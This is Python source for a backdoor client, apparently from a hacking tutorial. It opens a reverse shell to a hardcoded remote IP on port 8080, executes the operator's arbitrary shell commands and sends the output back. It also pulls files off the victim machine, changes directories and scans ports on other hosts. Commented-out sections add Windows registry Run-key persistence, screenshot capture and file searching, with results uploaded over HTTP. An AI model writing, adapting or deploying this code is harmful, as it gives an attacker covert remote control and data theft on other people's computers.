#

import socket
import subprocess
import os
import time
import random
import shutil
import sys
#from PIL import ImageGrab
#import tempfile
#import winreg as wreg

#Reconn Phase
#path = os.getcwd().strip('/n')

#Null, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().split('=')

#destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'

#If it was the first time our backdoor gets executed, then Do phase 1 and phase 2 
#if not os.path.exists(destination):
#    shutil.copyfile(path+'\client.exe', destination) #You can replace   path+'\client.exe' with sys.argv[0] ---> the sys.argv[0] will return the file name

#    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
#    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
#    key.Close()

# In the transfer function, we first check if the file exisits in the first place, if not we will notify the attacker
# otherwise, we will create a loop where each time we iterate we will read 1 KB of the file and send it, since the
# server has no idea about the end of the file we add a tag called 'DONE' to address this issue, finally we close the file
def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())
        
def scanner(s, ip, ports):
    scan_result = '' # scan_result is a variable stores our scanning result
    for port in ports.split(','):
        try: # we will try to make a connection using socket library for EACH one of these ports
            sock =  socket.socket()
#connect_ex This function returns 0 if the operation succeeded,  and in our case operation succeeded means that the connection happens whihch means the port is open otherwsie the port could be closed or the host is unreachable in the first place.
            output = sock.connect_ex((ip, int(port)))
            if output == 0:
                scan_result = scan_result + "[+] Port " + port + " is opened" + "\n"
            else:
                scan_result = scan_result + "[-] Port " + port + " is closed" + "\n"
                sock.close()
        except Exception as e:
            pass
    s.send(scan_result.encode())
        
def connect(ip):
    s = socket.socket()
    s.connect((ip, 8080))
    
    while True:
        command = s.recv(1024)

        if 'terminate' in command.decode():
            return 1

# if we received grab keyword from the attacker, then this is an indicator for file transfer operation, hence we will split the received commands into two parts, the second part which we intersted in contains the file path, so we will store it into a varaible called path and pass it to transfer function
         
# Remember the Formula is  grab*<File Path>
# Absolute path example:  grab*C:\Users\Hussam\Desktop\photo.jpeg

        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass
        elif 'cd' in command.decode():
            code, directory = command.decode().split('*') # the formula here is gonna be cd*directory
            try:
                os.chdir(directory) # changing the directory 
                s.send(('[+] CWD is ' + os.getcwd()).encode()) # we send back a string mentioning the new CWD
            except Exception as e:
                s.send(('[-]  ' + str(e)).encode())
#        elif 'screencap' in command: #If we got a screencap keyword, then ..
#            dirpath = tempfile.mkdtemp() #Create a temp dir to store our screenshot file
#            ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG") #Save the screencap in the temp dir
#
#            url = "http://192.168.0.152:8080/store"
#            files = {'file': open(dirpath + "\img.jpg", 'rb')}
#            r = requests.post(url, files=files) #Transfer the file over our HTTP
#
#            files['file'].close() #Once the file gets transfered, close the file.
#            shutil.rmtree(dirpath) #Remove the entire temp dir
#         elif 'search' in command: #The Formula is search <path>*.<file extension>  -->for example let's say that we got search C:\\*.pdf
#            command = command[7:] #cut off the the first 7 character ,, output would be  C:\\*.pdf
#            path, ext = command.split('*')
#            lists = '' # here we define a string where we will append our result on it
#
#            for dirpath, dirname, files in os.walk(path):
#               for file in files:
#                   if file.endswith(ext):
#                       lists = lists + '\n' + os.path.join(dirpath, file)
#            requests.post(url='http://192.168.0.152:8080', data=lists)
        elif 'scan' in command.decode(): # syntax: scan 10.10.10.100:22,80
            command = command[5:].decode() #slice the leading first 5 char 
            ip, ports = command.split(':')
            scanner(s, ip, ports)
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())

while True:
    try:
        #ip = "192.168.1.106"
        ip = "25.60.94.167"
        #ip = socket.gethostbyname('firstblood.hopto.org')
        if connect(ip) == 1:
            break
    except:
        sleep_for = random.randrange(1, 10)#Sleep for a random time between 1-10 seconds
        time.sleep(int(sleep_for))
        #time.sleep( sleep_for * 60 )      #Sleep for a random time between 1-10 minutes
        pass
